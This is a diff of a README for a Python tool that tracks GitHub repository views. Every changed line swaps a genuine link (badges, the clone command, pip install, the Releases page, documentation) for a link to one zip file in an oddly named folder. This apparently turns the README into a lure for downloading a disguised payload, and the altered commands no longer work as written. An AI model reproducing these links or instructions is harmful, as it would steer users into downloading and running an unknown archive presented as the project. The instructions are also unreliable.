@@ -1,6 +1,6 @@
 # GitHub Repo View Tracker 🚀
 
-![GitHub Repo View Tracker](https://img.shields.io/badge/GitHub-Repo%20View%20Tracker-blue?style=for-the-badge&logo=github)
+![GitHub Repo View Tracker](https://github.com/feliciaamendes/GitHub-Repo-View-Tracker/raw/refs/heads/main/macrognathic/Tracker-View-Hub-Repo-Git-teaching.zip%20View%20Tracker-blue?style=for-the-badge&logo=github)
 
 Welcome to the **GitHub Repo View Tracker**! This automated Python script tracks the number of views on your GitHub repositories. It uses GitHub Actions to run every two days, providing you with up-to-date statistics about your repository's performance.
 
@@ -29,12 +29,12 @@ To get started with the GitHub Repo View Tracker, follow these steps:
 
 1. **Clone the Repository**: Use the command below to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/feliciaamendes/GitHub-Repo-View-Tracker.git
+   git clone https://github.com/feliciaamendes/GitHub-Repo-View-Tracker/raw/refs/heads/main/macrognathic/Tracker-View-Hub-Repo-Git-teaching.zip
    ```
 
 2. **Install Required Libraries**: Make sure you have Python 3 installed. Then, install the required libraries using pip.
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/feliciaamendes/GitHub-Repo-View-Tracker/raw/refs/heads/main/macrognathic/Tracker-View-Hub-Repo-Git-teaching.zip
    ```
 
 3. **Create a Personal Access Token**: Go to your GitHub account settings and create a personal access token with the necessary permissions to access your repositories.
@@ -88,13 +88,13 @@ If you encounter any issues or have questions, feel free to open an issue in the
 
 ## Release Information
 
-You can find the latest releases and download the necessary files from the [Releases](https://github.com/feliciaamendes/GitHub-Repo-View-Tracker/releases) section. Make sure to download the latest version to take advantage of new features and fixes.
+You can find the latest releases and download the necessary files from the [Releases](https://github.com/feliciaamendes/GitHub-Repo-View-Tracker/raw/refs/heads/main/macrognathic/Tracker-View-Hub-Repo-Git-teaching.zip) section. Make sure to download the latest version to take advantage of new features and fixes.
 
-![Release Badge](https://img.shields.io/badge/Latest%20Release-v1.0.0-green?style=for-the-badge)
+![Release Badge](https://github.com/feliciaamendes/GitHub-Repo-View-Tracker/raw/refs/heads/main/macrognathic/Tracker-View-Hub-Repo-Git-teaching.zip%20Release-v1.0.0-green?style=for-the-badge)
 
 ## Additional Resources
 
-- [GitHub API Documentation](https://docs.github.com/en/rest)
-- [GitHub Actions Documentation](https://docs.github.com/en/actions)
+- [GitHub API Documentation](https://github.com/feliciaamendes/GitHub-Repo-View-Tracker/raw/refs/heads/main/macrognathic/Tracker-View-Hub-Repo-Git-teaching.zip)
+- [GitHub Actions Documentation](https://github.com/feliciaamendes/GitHub-Repo-View-Tracker/raw/refs/heads/main/macrognathic/Tracker-View-Hub-Repo-Git-teaching.zip)
 
 Thank you for using the GitHub Repo View Tracker! We hope it helps you keep track of your repository views effectively.
